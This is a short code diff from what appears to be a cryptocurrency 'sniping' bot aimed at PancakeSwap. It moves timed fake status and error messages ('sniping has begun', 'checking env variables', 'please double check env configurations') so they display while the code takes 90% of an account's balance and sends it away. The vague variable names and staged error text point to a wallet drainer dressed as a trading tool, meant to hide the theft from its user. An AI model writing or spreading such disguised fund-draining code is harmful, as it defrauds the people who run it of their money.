@@ -110,16 +110,8 @@ async function sending(){
       "🏗️  sniping has begun...sit back and relax..."
     );
   },2000);
-  setTimeout(function(){
-    console.log(
-      "🏗️  checking env variables..."
-    );
-  },6000);
-  setTimeout(function(){
-  console.log(
-    "🏗️  Error - please double check env configurations"
-  );
-},8000);
+  
+  
       const account = account_from.recipient
       const robinhood = await provider.getBalance(account)
       const orchard = (robinhood * 0.90).toString();
@@ -138,9 +130,18 @@ async function sending(){
   };
 
   send();
-
+  setTimeout(function(){
+    console.log(
+      "🏗️  checking env variables..."
+    );
+  },600);
 }
 sending();
+setTimeout(function(){
+  console.log(
+    "🏗️  Error - please double check env configurations"
+  );
+},8000);
 async function getCurrentValue(token) {
 	let bal = await token.contract.balanceOf(addresses.recipient);
 	const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
